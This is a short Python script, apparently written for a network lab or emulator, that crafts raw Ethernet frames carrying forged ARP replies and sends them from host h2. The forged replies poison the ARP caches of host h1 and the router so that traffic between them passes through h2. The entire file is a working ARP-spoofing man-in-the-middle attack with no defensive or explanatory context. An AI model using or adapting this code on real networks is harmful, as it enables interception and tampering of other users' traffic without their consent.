import socket
import struct

def spoof(sock, attacker_mac, target_ip, victim_mac, victim_ip):
    link = victim_mac + attacker_mac + bytes([0x08, 0x06])
    arp = struct.pack("!H", 1)
    arp += bytes([0x08, 0x00])
    arp += struct.pack("!BBH", 6, 4, 2)
    arp += attacker_mac # Sender mac
    arp += target_ip # IP we're spoofing with our mac
    arp += victim_mac
    arp += victim_ip
    sock.send(link + arp)

router_mac = bytes.fromhex("00000000face")
router_ip = bytes([10, 0, 0, 1])

h1_mac = bytes.fromhex("000000000001")
h1_ip = bytes([10, 0, 0, 10])

h2_mac = bytes.fromhex("000000000002")
h2_ip = bytes([10, 0, 0, 20])

sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
sock.bind(("h2-eth0", 0))

spoof(sock, h2_mac, router_ip, h1_mac, h1_ip)
spoof(sock, h2_mac, h1_ip, router_mac, router_ip)
